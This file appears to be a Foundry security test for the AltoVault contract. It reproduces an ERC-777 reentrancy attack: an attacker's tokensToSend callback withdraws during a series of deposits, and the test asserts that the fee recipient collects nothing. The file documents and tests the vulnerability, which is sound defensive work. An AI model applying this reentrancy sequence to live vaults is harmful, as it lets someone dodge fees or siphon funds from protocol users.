pragma solidity ^0.8.0;

import {ERC1820Registry} from "../../helpers/ERC1820Registry.sol";
import {ERC777Mock, IERC1820Registry} from "../../helpers/ERC777Mock.sol";
import {
    IERC1820Implementer
} from "@bundler3/lib/permit2/lib/openzeppelin-contracts/contracts/interfaces/IERC1820Implementer.sol";
import {console2} from "forge-std/console2.sol";

import "./helpers/IntegrationTest.sol";

uint256 constant FEE = 0.1 ether; // 10%
bytes32 constant TOKENS_SENDER_INTERFACE_HASH = keccak256("ERC777TokensSender");
bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");

contract ReentrancyTest is IntegrationTest, IERC1820Implementer {
    address internal attacker = makeAddr("attacker");

    ERC777Mock internal reentrantToken;
    ERC1820Registry internal registry;

    function setUp() public override {
        super.setUp();

        registry = new ERC1820Registry();

        registry.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));
        registry.setInterfaceImplementer(address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this));

        reentrantToken = new ERC777Mock(100_000, new address[](0), IERC1820Registry(address(registry)));

        idleMarket = _deployMarket(
            address(collateralToken), address(reentrantToken), 0, address(idleMarketOracle), address(irmIdleMarket)
        );

        vault = IAltoVault(address(new AltoVault(OWNER, TIMELOCK, address(reentrantToken), "Alto Vault", "AV")));

        vm.startPrank(OWNER);
        vault.setCurator(CURATOR);
        vault.setIsAllocator(ALLOCATOR, true);
        vault.setFeeRecipient(FEE_RECIPIENT);
        vm.stopPrank();

        _setCap(idleMarket, type(uint184).max);
        _setFee(FEE);

        reentrantToken.approve(address(vault), type(uint256).max);

        vm.prank(SUPPLIER);
        reentrantToken.approve(address(vault), type(uint256).max);

        reentrantToken.setBalance(SUPPLIER, 100_000 ether); // SUPPLIER supplies 100_000e18 tokens to AltoVault.

        console2.log("Supplier starting with %s tokens.", loanToken.balanceOf(SUPPLIER));

        vm.prank(SUPPLIER);
        uint256 userShares = IERC4626(address(vault)).deposit(100_000 ether, SUPPLIER);

        console2.log(
            "Supplier deposited %s loanTokens to altoVault in exchange for %s shares.",
            IERC4626(address(vault)).previewRedeem(userShares),
            userShares
        );
        console2.log("Finished setUp.");
    }

    function test777Reentrancy() public {
        reentrantToken.setBalance(attacker, 100_000); // Mint 100_000 tokens to attacker.

        console2.log("Attacker starting with %s tokens", reentrantToken.balanceOf(attacker));
        console2.log("Fee recipient starting with %s tokens", reentrantToken.balanceOf(FEE_RECIPIENT));

        vm.startPrank(attacker);

        registry.setInterfaceImplementer(attacker, TOKENS_SENDER_INTERFACE_HASH, address(this)); // Set test contract
        // to receive ERC-777 callbacks.
        registry.setInterfaceImplementer(attacker, TOKENS_RECIPIENT_INTERFACE_HASH, address(this)); // Required "hack"
        // because done all in a single Foundry test.

        reentrantToken.approve(address(vault), 100_000);

        IERC4626(address(vault)).deposit(1, attacker); // Initial deposit of 1 token to be able to call withdraw(1) in the subcall
        // before depositing(5000)

        IERC4626(address(vault)).deposit(5_000, attacker); // Deposit 5000, withdraw 1 in the subcall. Total deposited 5000,

        vm.startPrank(attacker); // Have to re-call startPrank because contract was reentered. Hacky but works.
        IERC4626(address(vault)).deposit(5_000, attacker); // Same as above.

        vm.startPrank(attacker);
        IERC4626(address(vault)).deposit(5_000, attacker); // Same as above.

        vm.startPrank(attacker);
        IERC4626(address(vault)).deposit(5_000, attacker); // Same as above.

        // Withdraw everything

        vm.startPrank(attacker);
        IERC4626(address(vault)).withdraw(IERC4626(address(vault)).maxWithdraw(attacker), attacker, attacker); // Withdraw all tokens of attacker.

        vm.startPrank(FEE_RECIPIENT);
        IERC4626(address(vault))
            .withdraw(IERC4626(address(vault)).maxWithdraw(FEE_RECIPIENT), FEE_RECIPIENT, FEE_RECIPIENT); // Fee recipient have 0 shares

        console2.log("Attacker ending with %s tokens", reentrantToken.balanceOf(attacker)); // 100_000
        console2.log("Fee recipient ending with %s tokens", reentrantToken.balanceOf(FEE_RECIPIENT)); // 0

        assertEq(reentrantToken.balanceOf(FEE_RECIPIENT), 0, "balanceOf(FEE_RECIPIENT)");
    }

    function tokensToSend(address, address from, address to, uint256 amount, bytes calldata, bytes calldata) external {
        if ((from == attacker) && (amount == 5000)) {
            // Don't call back on first deposit(1)
            vm.startPrank(attacker);
            IERC4626(to).withdraw(1, attacker, attacker);
            vm.stopPrank();
        }
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata data,
        bytes calldata operatorData
    ) external {}

    function canImplementInterfaceForAddress(bytes32, address) external pure returns (bytes32) {
        // Required for ERC-777
        return keccak256(abi.encodePacked("ERC1820_ACCEPT_MAGIC"));
    }
}
